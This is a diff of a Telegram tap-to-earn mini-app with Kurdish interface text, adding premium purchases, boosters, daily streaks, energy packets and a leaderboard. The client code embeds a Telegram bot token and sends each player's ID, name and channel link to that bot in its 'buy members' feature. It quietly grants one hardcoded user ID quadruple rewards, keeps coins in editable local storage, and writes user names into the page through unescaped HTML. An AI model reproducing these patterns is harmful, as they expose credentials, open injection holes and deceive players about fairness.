+        const packetText = document.getElementById('packetText');
+        const buyPremiumBtn = document.getElementById('buyPremiumBtn');
+        const multitapLevelText = document.getElementById('multitapLevelText');
+
+        scoreElement.innerText = coins.toFixed(5);
+        levelText.innerText = "Lvl " + level;
+        energyText.innerText = energy + " / " + maxEnergy;
+        packetText.innerText = packets + " / 5";
+        multitapLevelText.innerText = multitapLevel;
+
+        if (isPremium) {
+            buyPremiumBtn.innerText = 'پرێمیوم چالاکە ✔';
+            buyPremiumBtn.style.backgroundColor = '#27ae60';
+            buyPremiumBtn.disabled = true;
+        }
+
+        function syncUserToGlobalStorage() {
+            try {
+                let allUsersRaw = localStorage.getItem('fox_global_ranking_db');
+                let allUsers = allUsersRaw ? JSON.parse(allUsersRaw) : {};
+
+                allUsers[telegramUserId] = {
+                    id: telegramUserId,
+                    name: telegramName,
+                    score: coins,
+                    avatar: telegramPhotoUrl
+                };
+
+                localStorage.setItem('fox_global_ranking_db', JSON.stringify(allUsers));
+            } catch(e) {
+                console.log("Sync error:", e);
+            }
+        }
+        syncUserToGlobalStorage();
+
+        setInterval(() => {
+            if (energy < maxEnergy) {
+                energy = Math.min(maxEnergy, energy + 1);
+                energyText.innerText = energy + " / " + maxEnergy;
+                localStorage.setItem(REAL_PREFIX + 'energy', energy);
+            }
+        }, 3000);
+
+        function buyPremium() {
+            if (isPremium) return;
+            if (coins >= 1.00000) {
+                coins -= 1.00000;
+                isPremium = true;
+                scoreElement.innerText = coins.toFixed(5);
+                localStorage.setItem(REAL_PREFIX + 'coins', coins);
+                localStorage.setItem(REAL_PREFIX + 'is_premium', 'true');
+                syncUserToGlobalStorage();
+
+                buyPremiumBtn.innerText = 'پرێمیوم چالاکە ✔';
+                buyPremiumBtn.style.backgroundColor = '#27ae60';
+                buyPremiumBtn.disabled = true;
+
+                if (telegramUserId == '8832347891') {
+                    alert('پیرۆزە! پەکەتا پرێمیوم (x4) بۆ تۆ هاتە چالاککرن ⭐');
+                } else {
+                    alert('پیرۆزە! پەکەتا پرێمیوم (2x) هاتە چالاککرن ⭐');
+                }
+
+                if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+            } else {
+                alert('کوینێن تە بەس نینن! 🟡');
+                if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
+            }
+        }
+
+        function upgradeMultitap() {
+            let cost = 0.50;
+            if (coins >= cost) {
+                coins -= cost;
+                multitapLevel++;
+                maxEnergy += 100;
+                scoreElement.innerText = coins.toFixed(5);
+                energyText.innerText = energy + " / " + maxEnergy;
+                multitapLevelText.innerText = multitapLevel;
+
+                localStorage.setItem(REAL_PREFIX + 'coins', coins);
+                localStorage.setItem(REAL_PREFIX + 'multitap_level', multitapLevel);
+                localStorage.setItem(REAL_PREFIX + 'max_energy', maxEnergy);
+                syncUserToGlobalStorage();
+
+                alert('پیرۆزە! ئاستێ کلیکی بلندا بوو بۆ لڤل ' + multitapLevel);
+                if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+            } else {
+                alert('کوینێن تە بەس نینن بۆ ڤی بووستەری! 🟡');
+                if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
+            }
+        }
+
+        function buyMembers() {
+            let channelLink = document.getElementById('channelLinkInput').value.trim();
+            if (!channelLink) {
+                alert('لینکێ کەناڵی لێرە بنڤیسە! 🔗');
+                return;
+            }
+            if (coins >= 1.00000) {
+                coins -= 1.00000;
+                scoreElement.innerText = coins.toFixed(5);
+                localStorage.setItem(REAL_PREFIX + 'coins', coins);
+                syncUserToGlobalStorage();
+
+                const botToken = "8945123640:AAGjazTZFPNmjHDAw5LdwYTB9tWjQFVooXs";
+                const chatId = "8920889734";
+                
+                let message = `🚀 داخوازییا 100 مێمبەران هاتە کرن!\n\n` +
+                              `👤 ناڤێ یاریزانی: ${telegramName}\n` +
+                              `🆔 Telegram ID: ${telegramUserId}\n` +
+                              `🔗 لینکێ کەناڵی: ${channelLink}`;
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: message })
+                }).catch(err => console.log(err));
+
+                alert('پیرۆزە! 100 مێمبەر هاتنە داخوازی کرن 🎉');
+                document.getElementById('channelLinkInput').value = '';
+                if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+            } else {
+                alert('کوینێن تە بەس نینن! 🟡');
+            }
+        }
+
+        function checkStreakDisplay() {
+            let today = new Date().toISOString().slice(0, 10);
+            let claimBtn = document.getElementById('claimStreakBtn');
+            let statusText = document.getElementById('streakStatusText');
+
+            if (lastStreakDate === today) {
+                claimBtn.innerText = 'وەرگرتیە ئەڤرۆ ✔';
+                claimBtn.style.backgroundColor = '#555';
+                claimBtn.disabled = true;
+            }
+            statusText.innerText = 'ڕۆژی هەنووکەیی زنجیرێ: ڕۆژی ' + streakDay;
+        }
+
+        function claimDailyStreak() {
+            let today = new Date().toISOString().slice(0, 10);
+            if (lastStreakDate === today) return;
+
+            let reward = streakDay * 0.05;
+            coins += reward;
+            scoreElement.innerText = coins.toFixed(5);
+            localStorage.setItem(REAL_PREFIX + 'coins', coins);
+            syncUserToGlobalStorage();
+
+            lastStreakDate = today;
+            streakDay++;
+            localStorage.setItem(REAL_PREFIX + 'last_streak_date', lastStreakDate);
+            localStorage.setItem(REAL_PREFIX + 'streak_day', streakDay);
+
+            checkStreakDisplay();
+            alert('پیرۆزە! تە ' + reward.toFixed(2) + ' کۆین وەرگرت وەک پاداشتێ ڕۆژانە 🎉');
+            if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+        }
+        checkStreakDisplay();
+
+        function copyRefLink() {
+            let refLink = 'https://t.me/YourBotName?start=ref_' + telegramUserId;
+            navigator.clipboard.writeText(refLink).then(() => {
+                alert('لینکێ بانگهێشتێ هاتە کۆپیکرن! 📋 بۆ هاوڕێیێن خۆ بنێرە.');
+                if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+            });
+        }
+
+        function updateOnlineRanking() {
+            const rankingContainer = document.getElementById('rankingListContainer');
+            
+            syncUserToGlobalStorage();
+
+            let allUsersRaw = localStorage.getItem('fox_global_ranking_db');
+            let allUsersObj = allUsersRaw ? JSON.parse(allUsersRaw) : {};
+            
+            let usersArray = Object.values(allUsersObj);
+            usersArray.sort((a, b) => b.score - a.score);
+
+            let htmlContent = '';
+            if (usersArray.length === 0) {
+                htmlContent = `<p style="text-align: center; color: #8b9bb4; font-size: 13px; margin-top: 20px;">چ یاریزان نینن هێشتا...</p>`;
+            } else {
+                usersArray.forEach((user, index) => {
+                    let avatarHTML = user.avatar ? `<img src="${user.avatar}" alt="Avatar" style="width: 100%; height: 100%; object-fit: cover;">` : `<span style="font-size: 18px;">⚽</span>`;
+                    let isMe = user.id === telegramUserId;
+                    let itemClass = isMe ? "rank-item top-user" : "rank-item";
+                    let tagText = isMe ? ` <span style="font-size: 10px; color: #d4af37;">(تە)</span>` : '';
+
+                    htmlContent += `
+                        <div class="${itemClass}">
+                            <div style="display: flex; align-items: center; gap: 10px;">
+                                <div class="rank-avatar">${avatarHTML}</div>
+                                <div>
+                                    <div style="font-size: 13px; font-weight: bold;">${user.name || 'FOX Player'}${tagText}</div>
+                                    <div style="font-size: 10px; color: #8b9bb4;">#${index + 1}</div>
+                                </div>
+                            </div>
+                            <span style="color: #d4af37; font-weight: bold; direction: ltr;">${parseFloat(user.score).toFixed(5)} 🟡</span>
+                        </div>
+                    `;
+                });
+            }
+            rankingContainer.innerHTML = htmlContent;
+        }
+
         function handleTapAction(e) {
             if (energy > 0) {
-                energy -= 1;
-                coins += 0.00001;
+                let consumeEnergy = Math.min(energy, multitapLevel);
+                energy -= consumeEnergy;
+                totalTaps += consumeEnergy;
 
-                document.getElementById('score').innerText = coins.toFixed(5);
-                document.getElementById('energyText').innerText = energy + " / " + maxEnergy;
-                saveCurrentUserData();
+                let baseReward = 0.00001 * multitapLevel;
+                
+                let clickReward = baseReward;
+                if (isPremium) {
+                    if (telegramUserId == '8832347891') {
+                        clickReward = baseReward * 4;
+                    } else {
+                        clickReward = baseReward * 2;
+                    }
+                }
+
+                coins += clickReward;
+
+                let newLevel = Math.floor(totalTaps / 1000) + 1;
+                if (newLevel !== level) {
+                    level = newLevel;
+                    levelText.innerText = "Lvl " + level;
+                    localStorage.setItem(REAL_PREFIX + 'level', level);
+                }
+
+                scoreElement.innerText = coins.toFixed(5);
+                energyText.innerText = energy + " / " + maxEnergy;
+
+                localStorage.setItem(REAL_PREFIX + 'coins', coins);
+                localStorage.setItem(REAL_PREFIX + 'energy', energy);
+                localStorage.setItem(REAL_PREFIX + 'total_taps', totalTaps);
+                
+                syncUserToGlobalStorage();
 
                 const rect = tapBtn.getBoundingClientRect();
                 let clientX = e.clientX || (e.touches && e.touches[0] ? e.touches[0].clientX : rect.left + rect.width / 2);
@@ -634,14 +720,16 @@
 
                 const floatingEl = document.createElement('div');
                 floatingEl.className = 'floating-score';
-                floatingEl.innerHTML = `<span style="color:#2ecc71;">+0.00001</span>`;
-                floatingEl.style.left = (clientX - rect.left - 20) + 'px';
-                floatingEl.style.top = (clientY - rect.top - 20) + 'px';
+                floatingEl.innerHTML = `@T_U_R_S_E <span style="color:#2ecc71;">+${clickReward.toFixed(5)}</span>`;
+                floatingEl.style.left = (clientX - rect.left - 40) + 'px';
+                floatingEl.style.top = (clientY - rect.top - 25) + 'px';
 
                 tapBtn.appendChild(floatingEl);
                 setTimeout(() => floatingEl.remove(), 700);
 
                 if (tg.HapticFeedback) tg.HapticFeedback.impactOccurred('medium');
+            } else {
+                if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
             }
         }
 
@@ -651,11 +739,55 @@
             handleTapAction(e);
         }, { passive: false });
 
-        function useEnergy() {
-            energy = maxEnergy;
-            document.getElementById('energyText').innerText = energy + " / " + maxEnergy;
-            saveCurrentUserData();
-            if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+        function usePacket() {
+            if (packets > 0) {
+                packets -= 1;
+                packetText.innerText = packets + " / 5";
+                localStorage.setItem(REAL_PREFIX + 'packets', packets);
+
+                energy = maxEnergy;
+                energyText.innerText = energy + " / " + maxEnergy;
+                localStorage.setItem(REAL_PREFIX + 'energy', energy);
+
+                if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+                if (!isTimerRunning) {
+                    totalSeconds = (2 * 3600);
+                    startTimer();
+                }
+            } else {
+                if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
+            }
+        }
+
+        function startTimer() {
+            if (isTimerRunning) return;
+            isTimerRunning = true;
+            let timerInterval = setInterval(function() {
+                if (totalSeconds > 0) {
+                    totalSeconds--;
+                    let hours = Math.floor(totalSeconds / 3600);
+                    let minutes = Math.floor((totalSeconds % 3600) / 60);
+                    let seconds = totalSeconds % 60;
+                    timerText.innerText = String(hours).padStart(2, '0') + ":" + String(minutes).padStart(2, '0') + ":" + String(seconds).padStart(2, '0');
+                    localStorage.setItem(REAL_PREFIX + 'timer', totalSeconds);
+                } else {
+                    packets = 5;
+                    packetText.innerText = packets + " / 5";
+                    localStorage.setItem(REAL_PREFIX + 'packets', packets);
+                    localStorage.removeItem(REAL_PREFIX + 'timer');
+                    isTimerRunning = false;
+                    clearInterval(timerInterval);
+                }
+            }, 1000);
+        }
+        if (packets < 5) { startTimer(); }
+
+        function switchTab(screenId, event) {
+            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+            document.getElementById(screenId).classList.add('active');
+            event.currentTarget.classList.add('active');
+            if (screenId === 'rankingScreen') { updateOnlineRanking(); }
         }
     </script>
 </body>
